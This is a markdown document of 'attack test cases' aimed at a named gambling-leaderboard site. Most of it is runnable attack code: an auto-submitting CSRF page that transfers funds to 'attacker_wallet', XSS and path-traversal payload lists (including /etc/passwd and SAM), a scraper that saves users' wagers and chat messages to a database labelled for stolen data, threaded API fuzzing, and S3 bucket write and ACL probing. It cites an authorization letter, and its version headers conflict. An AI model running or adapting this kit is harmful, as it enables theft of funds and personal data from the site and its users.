<!-- 
Author: @jlucus https://github.com/jlucus
Date: September 5, 2025
Version: 2.0.0
-->

# Attack Test Cases Documentation
**Project:** schneckyirl Security Testing  
**Version:** 1.0.0  
**Classification:** CONFIDENTIAL

---

## 📑 Table of Contents
1. [CSRF Attack Test Cases](#csrf-attack-test-cases)
2. [XSS Attack Test Cases](#xss-attack-test-cases)
3. [Data Exfiltration Test Cases](#data-exfiltration-test-cases)
4. [API Fuzzing Test Cases](#api-fuzzing-test-cases)
5. [RNG Manipulation Test Cases](#rng-manipulation-test-cases)
6. [Path Traversal Test Cases](#path-traversal-test-cases)
7. [Cloud Enumeration Test Cases](#cloud-enumeration-test-cases)

---

## 1. CSRF Attack Test Cases

### Test Case: CSRF-001 - Token Harvesting
**Location:** `/test_cases/csrf_attacks/csrf_001_harvest.py`
```python
#!/usr/bin/env python3
"""
Test Case: CSRF Token Harvesting
Objective: Extract and validate CSRF token from target
"""

import requests
from bs4 import BeautifulSoup
import json
import time

class CSRFHarvester:
    def __init__(self, target_url):
        self.target = target_url
        self.tokens = []
        
    def harvest_token(self):
        """Extract CSRF token from page"""
        try:
            response = requests.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Method 1: Meta tag
            meta_token = soup.find('meta', {'name': 'csrf-token'})
            if meta_token:
                token = meta_token.get('content')
                self.tokens.append({
                    'method': 'meta_tag',
                    'token': token,
                    'timestamp': time.time()
                })
                
            # Method 2: Hidden input
            csrf_input = soup.find('input', {'name': '_token'})
            if csrf_input:
                token = csrf_input.get('value')
                self.tokens.append({
                    'method': 'hidden_input',
                    'token': token,
                    'timestamp': time.time()
                })
                
            # Method 3: JavaScript variable
            scripts = soup.find_all('script')
            for script in scripts:
                if 'csrf' in str(script).lower():
                    # Extract token from JavaScript
                    pass
                    
            return self.tokens
            
        except Exception as e:
            return {'error': str(e)}

# Execution
if __name__ == "__main__":
    harvester = CSRFHarvester('https://schneckyirl.com')
    tokens = harvester.harvest_token()
    print(json.dumps(tokens, indent=2))
```

### Test Case: CSRF-002 - Token Replay Attack
**Location:** `/test_cases/csrf_attacks/csrf_002_replay.py`
```python
#!/usr/bin/env python3
"""
Test Case: CSRF Token Replay Attack
Objective: Test if token can be reused across sessions
"""

import requests
import time

def test_token_replay(target_url, token):
    """Test if CSRF token can be replayed"""
    
    test_results = {
        'token': token,
        'tests': []
    }
    
    # Test 1: Same session replay
    session1 = requests.Session()
    response1 = session1.post(
        f"{target_url}/api/test",
        data={'_token': token, 'action': 'test1'},
        headers={'X-CSRF-Token': token}
    )
    test_results['tests'].append({
        'name': 'same_session_replay',
        'status_code': response1.status_code,
        'success': response1.status_code == 200
    })
    
    # Test 2: Different session replay
    session2 = requests.Session()
    response2 = session2.post(
        f"{target_url}/api/test",
        data={'_token': token, 'action': 'test2'},
        headers={'X-CSRF-Token': token}
    )
    test_results['tests'].append({
        'name': 'different_session_replay',
        'status_code': response2.status_code,
        'success': response2.status_code == 200
    })
    
    # Test 3: Time-delayed replay
    time.sleep(60)  # Wait 1 minute
    response3 = requests.post(
        f"{target_url}/api/test",
        data={'_token': token, 'action': 'test3'},
        headers={'X-CSRF-Token': token}
    )
    test_results['tests'].append({
        'name': 'time_delayed_replay',
        'status_code': response3.status_code,
        'success': response3.status_code == 200
    })
    
    return test_results
```

### Test Case: CSRF-003 - Cross-Origin Attack
**Location:** `/test_cases/csrf_attacks/csrf_003_crossorigin.html`
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Cross-Origin Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Simulation</h1>
    
    <!-- Auto-submit form -->
    <form id="csrf-form" action="https://schneckyirl.com/api/transfer" method="POST">
        <input type="hidden" name="_token" value="VKUCPTsktjOOb6X2cxgmcfU125bPOy9EEfHoaQA6">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="recipient" value="attacker_wallet">
    </form>
    
    <!-- XMLHttpRequest method -->
    <script>
        // Method 1: Form submission
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
        
        // Method 2: AJAX request
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://schneckyirl.com/api/transfer', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.setRequestHeader('X-CSRF-Token', 'VKUCPTsktjOOb6X2cxgmcfU125bPOy9EEfHoaQA6');
        xhr.send('amount=10000&recipient=attacker_wallet');
        
        // Method 3: Fetch API
        fetch('https://schneckyirl.com/api/transfer', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': 'VKUCPTsktjOOb6X2cxgmcfU125bPOy9EEfHoaQA6'
            },
            body: JSON.stringify({
                amount: 10000,
                recipient: 'attacker_wallet'
            })
        });
    </script>
</body>
</html>
```

---

## 2. XSS Attack Test Cases

### Test Case: XSS-001 - Reflected XSS
**Location:** `/test_cases/xss_attacks/xss_001_reflected.py`
```python
#!/usr/bin/env python3
"""
Test Case: Reflected XSS Detection
Objective: Test for reflected XSS vulnerabilities
"""

import requests
from urllib.parse import quote

class ReflectedXSSTest:
    def __init__(self, target_url):
        self.target = target_url
        self.payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "';alert(1);//",
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>'
        ]
        
    def test_endpoints(self):
        """Test various endpoints for XSS"""
        vulnerable_endpoints = []
        
        # Common vulnerable parameters
        params = ['q', 'search', 'query', 'keyword', 'name', 
                  'username', 'email', 'message', 'comment', 'feedback']
        
        for param in params:
            for payload in self.payloads:
                # URL parameter injection
                test_url = f"{self.target}?{param}={quote(payload)}"
                response = requests.get(test_url)
                
                if payload in response.text:
                    vulnerable_endpoints.append({
                        'endpoint': test_url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET',
                        'reflected': True
                    })
                
                # POST parameter injection
                response = requests.post(
                    self.target,
                    data={param: payload}
                )
                
                if payload in response.text:
                    vulnerable_endpoints.append({
                        'endpoint': self.target,
                        'parameter': param,
                        'payload': payload,
                        'method': 'POST',
                        'reflected': True
                    })
        
        return vulnerable_endpoints
```

### Test Case: XSS-002 - Stored XSS
**Location:** `/test_cases/xss_attacks/xss_002_stored.py`
```python
#!/usr/bin/env python3
"""
Test Case: Stored XSS Testing
Objective: Test for stored/persistent XSS vulnerabilities
"""

import requests
import time
import hashlib

class StoredXSSTest:
    def __init__(self, target_url, session_cookie=None):
        self.target = target_url
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
        
    def inject_payload(self, endpoint, field, payload):
        """Inject XSS payload into storage"""
        # Generate unique identifier
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        tagged_payload = f"{payload}<!--{unique_id}-->"
        
        # Submit payload
        response = self.session.post(
            f"{self.target}/{endpoint}",
            data={field: tagged_payload}
        )
        
        return {
            'injection_status': response.status_code,
            'unique_id': unique_id,
            'payload': tagged_payload
        }
    
    def verify_persistence(self, view_endpoint, unique_id):
        """Check if payload persists in output"""
        response = self.session.get(f"{self.target}/{view_endpoint}")
        
        return {
            'persisted': unique_id in response.text,
            'full_payload_present': f"<!--{unique_id}-->" in response.text,
            'response_length': len(response.text)
        }
```

### Test Case: XSS-003 - DOM-based XSS
**Location:** `/test_cases/xss_attacks/xss_003_dom.js`
```javascript
/**
 * Test Case: DOM-based XSS Detection
 * Objective: Test for DOM XSS vulnerabilities
 */

class DOMXSSTest {
    constructor() {
        this.sinks = [
            'innerHTML',
            'outerHTML',
            'document.write',
            'document.writeln',
            'eval',
            'setTimeout',
            'setInterval',
            'Function',
            'location.href',
            'location.replace',
            'location.assign',
            'element.src',
            'element.href',
            'element.action'
        ];
        
        this.sources = [
            'location.search',
            'location.hash',
            'location.pathname',
            'document.URL',
            'document.documentURI',
            'document.baseURI',
            'document.referrer',
            'window.name'
        ];
    }
    
    findVulnerabilities() {
        const vulnerabilities = [];
        
        // Hook dangerous sinks
        this.sinks.forEach(sink => {
            this.hookSink(sink, vulnerabilities);
        });
        
        // Test with payloads
        this.testPayloads();
        
        return vulnerabilities;
    }
    
    hookSink(sinkName, vulnList) {
        // Override dangerous functions
        const original = eval(sinkName);
        
        eval(sinkName + ' = function() {' +
            'vulnList.push({' +
                'sink: "' + sinkName + '",' +
                'args: arguments,' +
                'stack: new Error().stack' +
            '});' +
            'return original.apply(this, arguments);' +
        '}');
    }
    
    testPayloads() {
        const payloads = [
            '#<img src=x onerror=alert(1)>',
            '?name=<script>alert(1)</script>',
            '#javascript:alert(1)',
            '?redirect=javascript:alert(1)'
        ];
        
        payloads.forEach(payload => {
            window.location.hash = payload;
            // Trigger any handlers
            window.dispatchEvent(new HashChangeEvent('hashchange'));
        });
    }
}
```

---

## 3. Data Exfiltration Test Cases

### Test Case: DATA-001 - Bulk Data Extraction
**Location:** `/test_cases/data_exfiltration/data_001_bulk.py`
```python
#!/usr/bin/env python3
"""
Test Case: Bulk Data Extraction
Objective: Extract all exposed data from client-side
"""

import requests
from bs4 import BeautifulSoup
import json
import sqlite3
from datetime import datetime

class BulkDataExtractor:
    def __init__(self, target_url):
        self.target = target_url
        self.extracted_data = {}
        self.setup_database()
        
    def setup_database(self):
        """Create SQLite database for stolen data"""
        self.conn = sqlite3.connect('extracted_data.db')
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                uid TEXT PRIMARY KEY,
                username TEXT,
                wagered REAL,
                currency TEXT,
                prize REAL,
                avatar TEXT,
                extracted_at TIMESTAMP
            )
        ''')
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY,
                user_id INTEGER,
                username TEXT,
                message TEXT,
                created_at TIMESTAMP,
                extracted_at TIMESTAMP
            )
        ''')
        
    def extract_page_data(self):
        """Extract all data from page"""
        response = requests.get(self.target)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find data-page attribute
        app_div = soup.find('div', id='app')
        if app_div and app_div.has_attr('data-page'):
            raw_data = app_div['data-page']
            # Clean and parse JSON
            clean_data = raw_data.replace('&quot;', '"')
            self.extracted_data = json.loads(clean_data)
            
            # Process and store data
            self.process_user_data()
            self.process_chat_data()
            self.process_financial_data()
            
        return self.extracted_data
    
    def process_user_data(self):
        """Extract and store user information"""
        if 'props' in self.extracted_data:
            props = self.extracted_data['props']
            
            # Process each leaderboard
            for board_type in ['rain', 'stake', 'rain_raffle', 'stake_raffle']:
                if board_type in props and 'history' in props[board_type]:
                    for history_entry in props[board_type]['history']:
                        if 'entries' in history_entry:
                            for user in history_entry['entries']:
                                self.conn.execute('''
                                    INSERT OR REPLACE INTO users 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)
                                ''', (
                                    user.get('uid', ''),
                                    user.get('username', ''),
                                    float(user.get('wagered', 0)),
                                    user.get('currency', 'USD'),
                                    float(user.get('prize', 0)),
                                    user.get('avatar', ''),
                                    datetime.now()
                                ))
            
            self.conn.commit()
    
    def process_chat_data(self):
        """Extract chat messages"""
        if 'props' in self.extracted_data and 'chat' in self.extracted_data['props']:
            for msg in self.extracted_data['props']['chat']:
                self.conn.execute('''
                    INSERT OR REPLACE INTO messages 
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    msg['message']['id'],
                    msg['user']['id'],
                    msg['user']['username'],
                    msg['message']['message'],
                    msg['message']['created_at'],
                    datetime.now()
                ))
            
            self.conn.commit()
    
    def process_financial_data(self):
        """Extract financial information"""
        financial_data = {
            'total_wagered': 0,
            'total_prizes': 0,
            'users_by_wagered': []
        }
        
        cursor = self.conn.execute('''
            SELECT username, SUM(wagered) as total_wagered, 
                   SUM(prize) as total_prize
            FROM users 
            GROUP BY username 
            ORDER BY total_wagered DESC
        ''')
        
        for row in cursor:
            financial_data['users_by_wagered'].append({
                'username': row[0],
                'total_wagered': row[1],
                'total_prize': row[2]
            })
            financial_data['total_wagered'] += row[1]
            financial_data['total_prizes'] += row[2]
        
        return financial_data
```

---

## 4. API Fuzzing Test Cases

### Test Case: API-001 - Endpoint Discovery
**Location:** `/test_cases/api_fuzzing/api_001_discovery.py`
```python
#!/usr/bin/env python3
"""
Test Case: API Endpoint Discovery
Objective: Discover hidden API endpoints
"""

import requests
import concurrent.futures
from itertools import product

class APIEndpointDiscovery:
    def __init__(self, base_url):
        self.base_url = base_url
        self.discovered_endpoints = []
        self.load_wordlists()
        
    def load_wordlists(self):
        """Load API endpoint wordlists"""
        self.common_endpoints = [
            'api', 'v1', 'v2', 'admin', 'user', 'users', 'account',
            'login', 'logout', 'register', 'auth', 'authenticate',
            'token', 'refresh', 'verify', 'reset', 'password',
            'profile', 'settings', 'config', 'configuration',
            'wallet', 'balance', 'transfer', 'withdraw', 'deposit',
            'transaction', 'transactions', 'history', 'logs',
            'game', 'games', 'bet', 'bets', 'wager', 'play',
            'leaderboard', 'stats', 'statistics', 'analytics',
            'webhook', 'callback', 'notification', 'notifications',
            'upload', 'download', 'file', 'files', 'document',
            'search', 'query', 'filter', 'sort', 'export', 'import',
            'backup', 'restore', 'health', 'status', 'ping',
            'debug', 'test', 'dev', 'development', 'staging'
        ]
        
        self.http_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
        
    def fuzz_endpoints(self):
        """Fuzz for API endpoints"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            # Test single endpoints
            for endpoint in self.common_endpoints:
                for method in self.http_methods:
                    futures.append(
                        executor.submit(self.test_endpoint, endpoint, method)
                    )
            
            # Test nested endpoints
            for ep1, ep2 in product(self.common_endpoints[:10], self.common_endpoints):
                futures.append(
                    executor.submit(self.test_endpoint, f"{ep1}/{ep2}", 'GET')
                )
            
            # Collect results
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.discovered_endpoints.append(result)
        
        return self.discovered_endpoints
    
    def test_endpoint(self, path, method):
        """Test individual endpoint"""
        url = f"{self.base_url}/{path}"
        
        try:
            response = requests.request(
                method, 
                url, 
                timeout=5,
                allow_redirects=False
            )
            
            # Interesting status codes
            if response.status_code not in [404, 403]:
                return {
                    'method': method,
                    'url': url,
                    'status': response.status_code,
                    'length': len(response.text),
                    'headers': dict(response.headers)
                }
        except:
            pass
        
        return None
```

---

## 5. RNG Manipulation Test Cases

### Test Case: RNG-001 - Pattern Analysis
**Location:** `/test_cases/rng_manipulation/rng_001_pattern.py`
```python
#!/usr/bin/env python3
"""
Test Case: RNG Pattern Analysis
Objective: Analyze randomness patterns for weaknesses
"""

import numpy as np
from scipy import stats
import matplotlib.pyplot as plt

class RNGPatternAnalysis:
    def __init__(self, random_data):
        self.data = random_data
        self.results = {}
        
    def run_all_tests(self):
        """Run comprehensive randomness tests"""
        self.results['monobit'] = self.monobit_test()
        self.results['runs'] = self.runs_test()
        self.results['chi_squared'] = self.chi_squared_test()
        self.results['serial'] = self.serial_test()
        self.results['entropy'] = self.calculate_entropy()
        self.results['autocorrelation'] = self.autocorrelation_test()
        
        return self.results
    
    def monobit_test(self):
        """NIST Monobit frequency test"""
        binary_data = ''.join([bin(x)[2:].zfill(8) for x in self.data])
        ones = binary_data.count('1')
        zeros = binary_data.count('0')
        
        s = abs(ones - zeros)
        n = len(binary_data)
        
        p_value = 2 * (1 - stats.norm.cdf(s / np.sqrt(n)))
        
        return {
            'ones': ones,
            'zeros': zeros,
            'p_value': p_value,
            'random': p_value > 0.01
        }
    
    def runs_test(self):
        """Test for runs of consecutive values"""
        binary_data = ''.join([bin(x)[2:].zfill(8) for x in self.data])
        
        runs = 1
        for i in range(1, len(binary_data)):
            if binary_data[i] != binary_data[i-1]:
                runs += 1
        
        n = len(binary_data)
        ones = binary_data.count('1')
        zeros = n - ones
        
        expected_runs = (2 * ones * zeros / n) + 1
        variance = (2 * ones * zeros * (2 * ones * zeros - n)) / (n**2 * (n - 1))
        
        if variance > 0:
            z = (runs - expected_runs) / np.sqrt(variance)
            p_value = 2 * (1 - stats.norm.cdf(abs(z)))
        else:
            p_value = 0
        
        return {
            'runs': runs,
            'expected': expected_runs,
            'p_value': p_value,
            'random': p_value > 0.01
        }
    
    def calculate_entropy(self):
        """Calculate Shannon entropy"""
        _, counts = np.unique(self.data, return_counts=True)
        probabilities = counts / len(self.data)
        entropy = -np.sum(probabilities * np.log2(probabilities))
        
        max_entropy = np.log2(len(np.unique(self.data)))
        
        return {
            'entropy': entropy,
            'max_entropy': max_entropy,
            'ratio': entropy / max_entropy,
            'random': (entropy / max_entropy) > 0.95
        }
```

---

## 6. Path Traversal Test Cases

### Test Case: PATH-001 - Directory Traversal
**Location:** `/test_cases/path_traversal/path_001_traversal.py`
```python
#!/usr/bin/env python3
"""
Test Case: Path Traversal Testing
Objective: Test for directory traversal vulnerabilities
"""

import requests
from urllib.parse import quote

class PathTraversalTest:
    def __init__(self, base_url):
        self.base_url = base_url
        self.payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '..//..//..//etc/passwd',
            '..\\..\\..\\.\\windows\\win.ini',
            'file:///etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd',
            'C:\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '/var/www/../../../../../../etc/passwd',
            '../../../../../../../../../../../etc/passwd%00.jpg',
            '..%00/..%00/..%00/etc/passwd',
            '\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd'
        ]
        
        self.success_indicators = [
            'root:x:0:0',  # Linux passwd file
            '[fonts]',      # Windows win.ini
            'SYSTEM\\CurrentControlSet',  # Windows registry
            'localhost',    # hosts file
            '<?php',        # PHP files
            'server {',     # nginx config
            'DocumentRoot', # Apache config
        ]
        
    def test_endpoint(self, endpoint, param_name='file'):
        """Test specific endpoint for path traversal"""
        vulnerabilities = []
        
        for payload in self.payloads:
            # GET request
            url = f"{self.base_url}/{endpoint}?{param_name}={quote(payload)}"
            response = requests.get(url)
            
            for indicator in self.success_indicators:
                if indicator in response.text:
                    vulnerabilities.append({
                        'endpoint': endpoint,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'indicator': indicator,
                        'response_snippet': response.text[:500]
                    })
                    break
            
            # POST request
            response = requests.post(
                f"{self.base_url}/{endpoint}",
                data={param_name: payload}
            )
            
            for indicator in self.success_indicators:
                if indicator in response.text:
                    vulnerabilities.append({
                        'endpoint': endpoint,
                        'method': 'POST',
                        'parameter': param_name,
                        'payload': payload,
                        'indicator': indicator,
                        'response_snippet': response.text[:500]
                    })
                    break
        
        return vulnerabilities
```

---

## 7. Cloud Enumeration Test Cases

### Test Case: CLOUD-001 - S3 Bucket Enumeration
**Location:** `/test_cases/cloud_enum/cloud_001_s3.py`
```python
#!/usr/bin/env python3
"""
Test Case: S3 Bucket Enumeration
Objective: Enumerate and test S3 bucket permissions
"""

import boto3
from botocore import UNSIGNED
from botocore.config import Config
import requests

class S3BucketEnumerator:
    def __init__(self, target_domain):
        self.domain = target_domain
        self.s3_client = boto3.client('s3', config=Config(signature_version=UNSIGNED))
        self.discovered_buckets = []
        
    def generate_bucket_names(self):
        """Generate potential bucket names"""
        bucket_names = []
        
        # Common patterns
        patterns = [
            '{domain}',
            '{domain}-backup',
            '{domain}-backups',
            '{domain}-prod',
            '{domain}-production',
            '{domain}-dev',
            '{domain}-development',
            '{domain}-staging',
            '{domain}-test',
            '{domain}-uploads',
            '{domain}-files',
            '{domain}-static',
            '{domain}-assets',
            '{domain}-media',
            '{domain}-public',
            '{domain}-private',
            '{domain}-logs',
            '{domain}-data',
            'backup-{domain}',
            'prod-{domain}',
            'dev-{domain}',
            'staging-{domain}',
            'www-{domain}',
            'www.{domain}',
        ]
        
        base_domain = self.domain.replace('https://', '').replace('http://', '').replace('www.', '')
        
        for pattern in patterns:
            bucket_names.append(pattern.format(domain=base_domain))
            bucket_names.append(pattern.format(domain=base_domain.replace('.', '-')))
        
        return bucket_names
    
    def check_bucket(self, bucket_name):
        """Check if bucket exists and test permissions"""
        result = {
            'name': bucket_name,
            'exists': False,
            'permissions': []
        }
        
        # Check if bucket exists
        try:
            self.s3_client.head_bucket(Bucket=bucket_name)
            result['exists'] = True
        except:
            return result
        
        # Test various permissions
        tests = [
            ('list', self.test_list_objects),
            ('read', self.test_read_object),
            ('write', self.test_write_object),
            ('read_acl', self.test_read_acl),
            ('write_acl', self.test_write_acl)
        ]
        
        for test_name, test_func in tests:
            if test_func(bucket_name):
                result['permissions'].append(test_name)
        
        if result['permissions']:
            self.discovered_buckets.append(result)
        
        return result
    
    def test_list_objects(self, bucket_name):
        """Test if we can list objects"""
        try:
            self.s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
            return True
        except:
            return False
    
    def test_read_object(self, bucket_name):
        """Test if we can read objects"""
        try:
            # Try to read a common file
            response = requests.get(f'https://{bucket_name}.s3.amazonaws.com/index.html')
            return response.status_code == 200
        except:
            return False
    
    def test_write_object(self, bucket_name):
        """Test if we can write objects"""
        try:
            self.s3_client.put_object(
                Bucket=bucket_name,
                Key='test-write.txt',
                Body=b'test'
            )
            # Clean up
            self.s3_client.delete_object(Bucket=bucket_name, Key='test-write.txt')
            return True
        except:
            return False
    
    def test_read_acl(self, bucket_name):
        """Test if we can read bucket ACL"""
        try:
            self.s3_client.get_bucket_acl(Bucket=bucket_name)
            return True
        except:
            return False
    
    def test_write_acl(self, bucket_name):
        """Test if we can write bucket ACL"""
        try:
            # This is dangerous - don't actually do this in production
            # Just check if we get permission denied vs other errors
            self.s3_client.put_bucket_acl(
                Bucket=bucket_name,
                ACL='private'
            )
            return True
        except Exception as e:
            return 'AccessDenied' not in str(e)
```

---

## Test Execution Framework

### Master Test Runner
**Location:** `/test_cases/run_all_tests.py`
```python
#!/usr/bin/env python3
"""
Master Test Execution Framework
Runs all security test cases and generates report
"""

import sys
import json
import importlib
from datetime import datetime
from pathlib import Path

class SecurityTestRunner:
    def __init__(self, target_url):
        self.target = target_url
        self.results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'tests': {}
        }
        
    def run_all_tests(self):
        """Execute all test cases"""
        test_modules = [
            'csrf_attacks.csrf_001_harvest',
            'csrf_attacks.csrf_002_replay',
            'xss_attacks.xss_001_reflected',
            'xss_attacks.xss_002_stored',
            'data_exfiltration.data_001_bulk',
            'api_fuzzing.api_001_discovery',
            'rng_manipulation.rng_001_pattern',
            'path_traversal.path_001_traversal',
            'cloud_enum.cloud_001_s3'
        ]
        
        for module_name in test_modules:
            try:
                print(f"[*] Running {module_name}...")
                module = importlib.import_module(module_name)
                
                # Execute test
                result = module.run_test(self.target)
                self.results['tests'][module_name] = {
                    'status': 'completed',
                    'findings': result
                }
                
                print(f"[+] {module_name} completed")
                
            except Exception as e:
                print(f"[-] {module_name} failed: {str(e)}")
                self.results['tests'][module_name] = {
                    'status': 'failed',
                    'error': str(e)
                }
        
        # Generate report
        self.generate_report()
        
    def generate_report(self):
        """Generate HTML and JSON reports"""
        # Save JSON report
        with open('results/test_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Generate HTML report
        html = self.generate_html_report()
        with open('results/test_report.html', 'w') as f:
            f.write(html)
        
        print("\n[+] Reports generated:")
        print("    - results/test_results.json")
        print("    - results/test_report.html")
    
    def generate_html_report(self):
        """Create HTML report"""
        vulnerabilities = []
        for test_name, test_result in self.results['tests'].items():
            if test_result['status'] == 'completed' and test_result.get('findings'):
                vulnerabilities.append({
                    'test': test_name,
                    'findings': test_result['findings']
                })
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Test Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .critical {{ color: #d32f2f; font-weight: bold; }}
                .high {{ color: #f57c00; font-weight: bold; }}
                .medium {{ color: #fbc02d; }}
                .low {{ color: #388e3c; }}
                .vulnerability {{ 
                    border: 1px solid #ddd; 
                    padding: 10px; 
                    margin: 10px 0; 
                    border-radius: 5px;
                }}
                pre {{ background: #f5f5f5; padding: 10px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <h1>Security Test Report</h1>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Date:</strong> {self.results['timestamp']}</p>
            <p><strong>Total Tests:</strong> {len(self.results['tests'])}</p>
            <p><strong>Vulnerabilities Found:</strong> {len(vulnerabilities)}</p>
            
            <h2>Findings</h2>
            {''.join([self.format_finding(v) for v in vulnerabilities])}
        </body>
        </html>
        """
        
        return html
    
    def format_finding(self, vulnerability):
        """Format individual finding for HTML"""
        return f"""
        <div class="vulnerability">
            <h3>{vulnerability['test']}</h3>
            <pre>{json.dumps(vulnerability['findings'], indent=2)}</pre>
        </div>
        """

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python run_all_tests.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    runner = SecurityTestRunner(target)
    runner.run_all_tests()
```

---

## Test Case Severity Matrix

| Test Case | Severity | Impact | Exploitability | CVSS Score |
|-----------|----------|--------|----------------|------------|
| CSRF-001 | Critical | High | Easy | 9.1 |
| CSRF-002 | Critical | High | Easy | 9.1 |
| CSRF-003 | Critical | High | Medium | 8.8 |
| XSS-001 | High | Medium | Easy | 7.2 |
| XSS-002 | Critical | High | Medium | 8.8 |
| XSS-003 | High | Medium | Medium | 6.5 |
| DATA-001 | Critical | Critical | Trivial | 9.8 |
| API-001 | Medium | Medium | Easy | 5.3 |
| RNG-001 | High | High | Hard | 7.5 |
| PATH-001 | Critical | Critical | Medium | 9.1 |
| CLOUD-001 | High | High | Easy | 8.1 |

---

## Execution Guidelines

### Prerequisites
1. Authorization letter signed
2. Testing environment prepared
3. VPN/proxy configured
4. Monitoring tools active

### Execution Order
1. Reconnaissance (passive)
2. Data extraction tests
3. CSRF tests
4. XSS tests
5. API fuzzing
6. Path traversal
7. Cloud enumeration
8. RNG analysis

### Safety Measures
- Rate limiting: 10 requests/second max
- Session management: Rotate every 100 requests
- Error handling: Graceful failure
- Logging: Complete audit trail

---

**Document Version:** 1.0.0  
**Classification:** CONFIDENTIAL  
**Last Updated:** December 6, 2024
